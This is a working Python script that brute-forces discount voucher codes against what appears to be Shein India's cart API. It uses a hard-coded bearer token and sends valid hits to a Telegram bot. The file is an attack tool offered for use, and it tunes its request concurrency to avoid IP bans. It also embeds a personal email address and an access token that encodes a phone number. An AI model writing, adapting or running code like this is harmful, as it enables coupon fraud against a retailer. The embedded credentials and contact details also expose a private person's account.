import asyncio
import aiohttp
import random
import string
import os
import time
from aiohttp import web

# --- CONFIG ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHAT_ID = os.environ.get("CHAT_ID", "YOUR_CHAT_ID_HERE")
API_URL = "https://api.sheinindia.in/rilfnlwebservices/v2/rilfnl/users/manishisjh2@gmail.com/carts/SH7315703937/vouchers"

HEADERS = {
    "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzaGVpbl9tYW5pc2hpc2poMkBnbWFpbC5jb20iLCJwa0lkIjoiYWQyZDk0ZWEtMjBiMi00YWNmLWI3MjItOTZlNjQ5NzY4OGYzIiwiY2xpZW50TmFtZSI6InRydXN0ZWRfY2xpZW50Iiwicm9sZXMiOlt7Im5hbWUiOiJST0xFX0NVU1RPTUVSR1JPVVAifV0sIm1vYmlsZSI6Ijc5NzMzNjYzOTgiLCJ0ZW5hbnRJZCI6IlNIRUlOIiwiZXhwIjoxNzcxNTgxNDQ0LCJ1dWlkIjoiYWQyZDk0ZWEtMjBiMi00YWNmLWI3MjItOTZlNjQ5NzY4OGYzIiwiaWF0IjoxNzY4OTg5NDQ0LCJlbWFpbCI6Im1hbmlzaGlzamgyQGdtYWlsLmNvbSJ9.mvm2vKeeoK-_qJ0dBGbsIldXLzfeBdj9lBYxH53r90Z4aU1G2hLJWJ7NsZlmyho2MIrYxpgOd2ahpZgD3wAFg8GdQTA0uv8_DxSoQfRQCCIfFSf3ZpFdScWDDJVOFtw1gzzGijGugyA0btZx6vNsPFL53HcTffb7tqDMvyG_qmBdEoIMxEMBJoAIaDrp2c8meLY51BbatloCqdaPSgjK4euqo_wf5lck9lyXirKUVJKzrXBSncAu8hbtT5RxDJ-RYW4AFS_jOVU1SsCUZJ5TDZRqLxhN1UBekUoq4PZMuBaV5hJ8cFgRlJlsGiXALje4vHcl0CWGoqLed7rRqd4h1w",
    "Accept": "application/json",
    "User-Agent": "Android",
    "Content-Type": "application/x-www-form-urlencoded",
}

checked_count = 0
valid_hits = []
start_time = time.time()
counter_lock = asyncio.Lock()
is_paused = False  # Safety switch

# --- WEB UI ---
async def handle_status(request):
    status = "🔴 PAUSED (Check Logs/Token)" if is_paused else "🟢 RUNNING"
    html = f"""
    <body style='font-family:sans-serif; background:#121212; color:white; text-align:center; padding-top:50px;'>
        <h1 style='color:#00ff00;'>Gemini Brute-Force</h1>
        <p>Status: <b>{status}</b></p>
        <p>Checked: {checked_count} | Valid: {len(valid_hits)}</p>
        <hr style='width:50%; border:0.1px solid #333;'>
        <h3>Hits:</h3>
        {''.join([f'<div><code>{c}</code></div>' for c in valid_hits]) if valid_hits else 'None yet'}
    </body>
    """
    return web.Response(text=html, content_type='text/html')

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_status)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    await web.TCPSite(runner, '0.0.0.0', port).start()

# --- LOGIC ---
async def send_telegram(session, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        async with session.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}) as r:
            return await r.json()
    except: pass

async def worker(session, sem):
    global checked_count, is_paused
    while not is_paused:
        coupon = "SVD" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        async with sem:
            try:
                async with session.post(API_URL, data={"voucherId": coupon, "employeeOfferRestriction": "true"}, ssl=False, timeout=10) as r:
                    if r.status == 401 or r.status == 403:
                        is_paused = True
                        print(f"❌ TOKEN EXPIRED (Status {r.status})")
                        await send_telegram(session, "🚨 <b>STOPPED:</b> Token Expired. Update the Bearer token in your code.")
                        break
                    
                    if r.status == 429:
                        print("⚠️ Rate Limited. Sleeping 30s...")
                        await asyncio.sleep(30)
                        continue

                    text = await r.text()
                    async with counter_lock:
                        checked_count += 1
                        if '"errors"' not in text.lower():
                            valid_hits.append(coupon)
                            await send_telegram(session, f"🔥 <b>HIT!</b>\n<code>{coupon}</code>")
                        
                        if checked_count % 100 == 0:
                            print(f"📡 Progress: {checked_count} checked...")
            except Exception as e:
                await asyncio.sleep(5)

async def main():
    await start_web_server()
    # Use a lower semaphore (5) to avoid instant IP bans on Render
    sem = asyncio.Semaphore(5) 
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        await send_telegram(session, "🚀 <b>Bot Started on Render</b>")
        workers = [worker(session, sem) for _ in range(5)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
